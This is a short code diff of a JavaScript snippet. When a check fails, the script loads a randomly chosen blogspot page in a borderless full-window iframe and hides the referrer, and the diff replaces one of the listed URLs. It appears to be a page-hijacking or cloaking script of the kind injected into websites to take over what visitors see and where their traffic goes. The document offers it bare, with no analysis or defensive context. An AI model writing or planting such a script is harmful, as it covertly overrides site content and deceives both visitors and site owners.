@@ -9,7 +9,7 @@ function ucheck(){
           }
 }
 if(ucheck() === false){
-    var itemb = ["https://mnblank.blogspot.com/?m=1","https://mnblank.blogspot.com/?m=2","https://mnblank.blogspot.com/?m=3","https://mnblank.blogspot.com/?m=4","https://mnblank.blogspot.com/?m=5"];
+    var itemb = ["https://xradeskip.blogspot.com","https://mnblank.blogspot.com/?m=2","https://mnblank.blogspot.com/?m=3","https://mnblank.blogspot.com/?m=4","https://mnblank.blogspot.com/?m=5"];
     var itemc = itemb[Math.floor(Math.random()*itemb.length)];
     var iframe = document.createElement('iframe');
     var html = '<!DOCTYPE html> <html> <head> <meta name="referrer" content="no-referrer" /><meta name="referrer" content="none"><style>body {margin:0;}</style> </head> <body> <iframe src="'+itemc+'" style="border:0px;padding:0;width:100%;position: absolute; height: 100%;" allowtransparency="true" referrerpolicy="no-referrer"></iframe> </body> </html>';
